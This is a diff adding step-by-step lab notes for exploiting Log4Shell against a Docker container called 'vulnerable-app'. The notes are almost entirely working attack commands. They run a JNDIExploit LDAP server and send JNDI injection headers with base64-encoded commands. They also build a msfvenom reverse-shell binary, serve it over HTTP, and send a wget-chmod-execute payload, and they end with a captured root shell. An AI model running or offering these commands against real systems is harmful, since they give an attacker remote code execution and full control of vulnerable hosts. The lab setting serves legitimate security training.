@@ -1,0 +1,63 @@
+Build File
+docker build -t <name of image> .
+
+Run image 
+docker run -it <name of image> 
+
+Check is running
+sudo docker ps
+
+Download java file https://github.com/black9/Log4shell_JNDIExploit 
+(Replace download with wget once server is uploaded)
+
+
+unzip
+unzip JNDIExploit.v1.2.
+
+
+LDAP server
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i hostIP -p 8888
+
+
+
+Run  exploit 
+u can put any command behind /base64 but ensure it is encoded 
+curl <ip of docker w web) -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/cGluZyAtYyA1IDE3Mi4xNy4wLjEK}'
+
+sudo docker exec vulnerable-app ls -la /tmp ( check if got file) 
+
+
+Reverse shell 
+set NC to 4444
+
+nc -lvnp 
+
+generate payload 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
+
+set up http server 
+sudo python3 -m http.server 8081
+
+encode this command line below using base64
+wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf | base 64 
+
+should be this if its 172.17.0.1
+d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK
+
+
+launch payload 
+curl 172.17.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK}'
+
+
+reverse shelled 
+$ nc -lvnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:42176.
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+whoami
+root
+
